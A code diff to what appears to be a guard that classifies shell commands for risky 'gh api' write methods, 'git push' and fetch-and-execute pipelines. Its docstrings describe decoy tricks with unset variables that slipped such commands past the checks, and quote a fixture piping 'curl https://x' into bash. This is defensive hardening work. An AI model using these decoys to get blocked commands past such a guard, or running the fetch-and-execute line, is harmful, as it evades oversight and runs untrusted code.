@@ -1191,7 +1191,48 @@ def _token_is_all_unassigned_refs(token: str, name_to_value: dict[str, str]) -> 
     `_ONE_REF_SRC`'s two alternatives each pair their own opening and
     closing brace, so a mismatched brace now falls through to neither
     alternative and is correctly left unstripped, as fused-on literal
-    text that does not vanish to nothing."""
+    text that does not vanish to nothing.
+
+    Considered, and REJECTED, during Step 8 independent review, twenty-
+    second round (issue #1326): making this function ALSO check every
+    SHORTER prefix of an unbraced bare name via `_unbraced_ref_options`
+    (the same ambiguity primitive `_substitute_var_refs_candidates`
+    itself uses -- shlex has already lost whether a raw token like
+    `$aost` was originally `$aost`, bare, or `"$ao"st`, a quoted `$ao`
+    reference fused with literal "st") -- to close a real gap in
+    `_gh_api_method_flagname_dynamic_hit`'s own value-position skip-loop,
+    which wrongly skipped PAST a genuine write-method value shaped
+    exactly this way. That fix was correct for THAT one call site, but
+    applying it broadly here regressed a round-18 fixture LIVE:
+    `A=($A_UNSET$B_UNSET pnpm); "${A[@]}"` and `A=($A_UNSET$B_UNSET curl
+    https://x | bash); "${A[@]}"` were both wrongly ALLOWED once this
+    function started consulting `_unbraced_ref_options` -- the outer
+    `A=(` assignment itself populates NAME_TO_VALUE with `{"A": ""}` (an
+    `_assigned_literals` parsing artifact of `A=` immediately followed by
+    the array's own opening paren as a separate punctuation token, not a
+    real scalar value for `A`), which is a prefix of the UNRELATED inner
+    name `A_UNSET` purely by coincidence of spelling -- wrongly reporting
+    the whole `$A_UNSET$B_UNSET` token as possibly-not-vanishing, which
+    silently disabled `_strip_leading_unassigned_bare_refs`'s own
+    stripping for it, which `_rule_bare_install`/`_rule_process_sub_
+    fetch_exec`'s own position-anchored checks depend on entirely to see
+    the real tool once the leading decoy is gone (`_rule_a_literal`'s own
+    whole-segment adjacency scan happens to provide a safety net for the
+    `gh`+`pr`+`merge` phrase specifically, which is why THAT one fixture
+    stayed green throughout this regression and masked it from the
+    scoped test run that first validated this ambiguity check). Left
+    UNCHANGED here: every caller of THIS function (`_strip_leading_
+    unassigned_bare_refs`, `_is_git_push_segment`, `_process_sub_feeds_
+    fetch_tool`, `_skip_fetch_exec_wrapper`, `_fetch_tool_head`, plus the
+    array-literal-content recursion) uses "vanishes" to mean "safe to
+    strip and additionally try the collapsed reading, or safe to skip
+    past" -- the fail-closed direction for those callers is to KEEP
+    trying the stripped/skipped reading, the opposite of `_gh_api_
+    method_dynamic_value`/`_gh_api_method_flagname_dynamic_hit`'s own
+    value-position read, where the fail-closed direction is to STOP at
+    the token and treat it as the value. The ambiguity check instead
+    lives in `_value_position_after`'s own narrower skip-loop below,
+    scoped to exactly the two callers that need it."""
     if not _REF_RUN_TOKEN_RE.match(token):
         return False
     return all((m.group("bare") or m.group("braced")) not in name_to_value for m in _REF_RUN_NAME_RE.finditer(token))
@@ -1486,11 +1527,91 @@ def _gh_api_method_literal_hit(literals: list[str]) -> bool:
     return False
 
 
-def _gh_api_method_dynamic_value(seg: list[str], index: int, raw_tok: str) -> str | None:
+def _token_is_unambiguously_vanishing(token: str, name_to_value: dict[str, str]) -> bool:
+    """Stricter than `_token_is_all_unassigned_refs`: TRUE only when TOKEN
+    vanishes to nothing under EVERY possible original-quoting reading, not
+    just the maximal-munch one `_token_is_all_unassigned_refs` itself
+    checks -- an UNBRACED bare name is also run through `_unbraced_ref_
+    options` (the same ambiguity primitive `_substitute_var_refs_
+    candidates` uses) to rule out a SHORTER assigned prefix that would
+    make the token resolve to real text instead (shlex has already lost
+    whether a raw token like `$aost` was originally `$aost`, bare, or
+    `"$ao"st`, a quoted `$ao` reference fused with literal "st"). Used
+    ONLY by `_value_position_after`'s own skip-loop below, deliberately
+    NOT folded into `_token_is_all_unassigned_refs` itself -- see that
+    function's own docstring for the live regression this narrower
+    scoping fixes: every OTHER caller of the plain check wants "vanishes
+    under the straightforward reading," and additionally distrusting a
+    coincidental shorter-prefix match there (e.g. an outer array literal
+    assignment's own NAME happening to prefix an unrelated inner
+    reference) silently disabled their own stripping/skipping instead of
+    protecting anything.
+
+    Found live by Step 8 independent review, twenty-second round (issue
+    #1326), as the fix that replaces the rejected broader version of
+    this same idea."""
+    if not _token_is_all_unassigned_refs(token, name_to_value):
+        return False
+    for match in _REF_RUN_NAME_RE.finditer(token):
+        bare_name = match.group("bare")
+        if bare_name is not None and _unbraced_ref_options(bare_name, name_to_value):
+            return False
+    return True
+
+
+def _value_position_after(seg: list[str], flag_index: int, name_to_value: dict[str, str]) -> str | None:
+    """The token following a flag at `seg[flag_index]`, skipping PAST any
+    leading run of vanishing-reference decoys first -- falls back to the
+    token immediately adjacent to the flag when skipping finds nothing
+    further, so a single, merely-unresolved-in-this-scope token (not a
+    genuine decoy with a real value beyond it) is still returned rather
+    than silently dropped. Returns None only when there is no token at
+    all past the flag, matching every prior caller's own established
+    `continue`/`None` behavior for that case.
+
+    Found live by Step 8 independent review, twenty-second round (issue
+    #1326), as the second half of the same fix that added the
+    skip-vanishing-decoys loop to `_gh_api_method_dynamic_value` and
+    `_gh_api_method_flagname_dynamic_hit` below: the first version of
+    that loop skipped past a leading decoy but then, finding nothing
+    further, gave up entirely (`return None`) instead of falling back to
+    the token right after the flag -- wrongly treating a single,
+    merely-unresolved token in that position (e.g. `-x $a` with `a` not
+    in scope, which many existing tests construct deliberately) as a
+    vanished decoy rather than the value itself. Shared here so both
+    callers -- and any future one needing the same "skip a decoy, but
+    never lose the one real candidate" shape -- stay in sync."""
+    j = flag_index + 1
+    while j < len(seg) and _token_is_unambiguously_vanishing(seg[j], name_to_value):
+        j += 1
+    if j < len(seg):
+        return seg[j]
+    if flag_index + 1 < len(seg):
+        return seg[flag_index + 1]
+    return None
+
+
+def _gh_api_method_dynamic_value(seg: list[str], index: int, raw_tok: str, name_to_value: dict[str, str]) -> str | None:
     """The dynamically constructed value part of a `-X`/`--method` flag at
     `seg[index]`, in whichever of the three shapes it takes (separate
     token, fused with `=`, or fused directly) -- or None if `raw_tok`
-    is not a `-X`/`--method` flag carrying a dynamic value at all."""
+    is not a `-X`/`--method` flag carrying a dynamic value at all.
+
+    Found live by Step 8 independent review, twenty-second round (issue
+    #1326): the separate-token case used to read `seg[index + 1]`
+    directly, assuming the value always sits immediately after the flag
+    -- a leading decoy interposed there (`-X $NEVERSET $M`, NEVERSET
+    never assigned) made this function return the DECOY itself as "the
+    value," which `_substitute_var_refs_candidates` then correctly
+    reported unresolvable (`[]`), silently missing the real value one
+    position further. A LITERAL value past the same decoy (`-X $NEVERSET
+    POST`) was already caught, unaffected, by `_gh_api_method_literal_
+    hit`'s own dynamic-filtered adjacency scan -- confirmed live this gap
+    was scoped to the doubly-dynamic case alone (decoy AND the real value
+    both unresolved-as-written). Closed by skipping (not stopping at) a
+    vanishing token here too, the same primitive `_skip_fetch_exec_
+    wrapper`'s own twenty-first-round fix already uses for an analogous
+    position in the task-scoped sibling module."""
     if _is_dynamic(raw_tok):
         lowered_tok = raw_tok.lower()
         # `.lstrip("=")`: `-x=$var` and `-x$var` both slice to a value part
@@ -1507,8 +1628,10 @@ def _gh_api_method_dynamic_value(seg: list[str], index: int, raw_tok: str) -> st
         if lowered_tok.startswith("--method="):
             return raw_tok[len("--method=") :]
         return None
-    if raw_tok.lower() in ("-x", "--method") and index + 1 < len(seg) and _is_dynamic(seg[index + 1]):
-        return seg[index + 1]
+    if raw_tok.lower() in ("-x", "--method"):
+        value_tok = _value_position_after(seg, index, name_to_value)
+        if value_tok is not None and _is_dynamic(value_tok):
+            return value_tok
     return None
 
 
@@ -1566,7 +1689,7 @@ def _gh_api_method_dynamic_hit(
     by Step 8 independent review, tenth round, issue #1326) -- this
     function itself has no direct use for it."""
     for i, raw_tok in enumerate(seg):
-        dynamic_value_part = _gh_api_method_dynamic_value(seg, i, raw_tok)
+        dynamic_value_part = _gh_api_method_dynamic_value(seg, i, raw_tok, name_to_value)
         if dynamic_value_part is None:
             continue
         if _is_unresolvable_substitution(dynamic_value_part):
@@ -1626,7 +1749,17 @@ def _gh_api_method_flagname_dynamic_hit(
     premise. Any candidate set too large to enumerate soundly is treated
     as an unresolved-but-plausible match -- fail closed, matching
     `_gh_api_method_fused_flagname_dynamic_hit`'s own established
-    posture."""
+    posture.
+
+    Found live by Step 8 independent review, twenty-second round (issue
+    #1326): the value token used to be read directly as `seg[i + 1]`,
+    assuming it always sits immediately after the (already-resolved)
+    flag-name token -- a leading decoy interposed there (`$F $NEVERSET
+    $M`, NEVERSET never assigned) made this function read the decoy
+    itself as "the value," missing a real, dynamically-resolved write
+    method one position further. Closed the same way as `_gh_api_method_
+    dynamic_value`'s own twenty-second-round fix: skip (don't stop at) a
+    vanishing token when looking for the value position."""
     for i, raw_tok in enumerate(seg):
         if not _is_dynamic(raw_tok):
             continue
@@ -1637,9 +1770,9 @@ def _gh_api_method_flagname_dynamic_hit(
             return True
         if not any(candidate.lower() in ("-x", "--method") for candidate in flag_candidates):
             continue
-        if i + 1 >= len(seg):
+        value_tok = _value_position_after(seg, i, name_to_value)
+        if value_tok is None:
             continue
-        value_tok = seg[i + 1]
         if _is_dynamic(value_tok):
             if _is_unresolvable_substitution(value_tok):
                 return True
@@ -1858,7 +1991,22 @@ def _rule_gh_api_write(
 _GIT_LONG_VALUE_FLAGS = {"--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"}
 
 
-def _is_git_push_segment(seg: list[str]) -> bool:
+def _is_git_push_segment(seg: list[str], name_to_value: dict[str, str]) -> bool:
+    """Found live by Step 8 independent review, twenty-second round (issue
+    #1326): the flag-skip loop below used to `break` the instant it met
+    ANY dynamic-shaped token, abandoning the scan rather than looking
+    past a token that vanishes to nothing at real bash runtime (per
+    `_token_is_all_unassigned_refs`) -- `git -v $NEVERSET push origin
+    main` (NEVERSET never assigned) was wrongly NOT recognized as a git
+    push, since the loop broke at the decoy sitting after the literal
+    `-v` flag, one position past where the `obfuscated_git_push_second_
+    token` fallback in `_classify_tokens` looks (only `seg[1]`).
+    Confirmed live via a real bash proxy (stand-in `git` binary on PATH,
+    capturing its own argv) that this genuinely runs `git push origin
+    main` once the decoy word-splits away. Closed by skipping (not
+    breaking on) a vanishing token here too, the same primitive
+    `_skip_fetch_exec_wrapper`'s own twenty-first-round fix already uses
+    for an analogous position in the task-scoped sibling module."""
     literals = [(t.lower() if not _is_dynamic(t) else None) for t in seg]
     for i, tok in enumerate(literals):
         if tok != "git":
@@ -1869,7 +2017,12 @@ def _is_git_push_segment(seg: list[str]) -> bool:
             # narrow a repeated `literals[j]` subscript the way it narrows
             # a plain variable.
             candidate = literals[j]
-            if candidate is None or not candidate.startswith("-"):
+            if candidate is None:
+                if _token_is_all_unassigned_refs(seg[j], name_to_value):
+                    j += 1
+                    continue
+                break
+            if not candidate.startswith("-"):
                 break
             flag = candidate
             j += 1
@@ -2164,7 +2317,7 @@ def _classify_tokens(
     raw_assigned = {**outer_raw, **_assigned_raw_values(tokens)}
     lowered_command = " ".join(tokens).lower()
 
-    is_git_push = is_git_push or any(_is_git_push_segment(seg) for seg in segments)
+    is_git_push = is_git_push or any(_is_git_push_segment(seg, assigned) for seg in segments)
 
     literal_hit = _rule_a_literal(segments)
     if literal_hit:
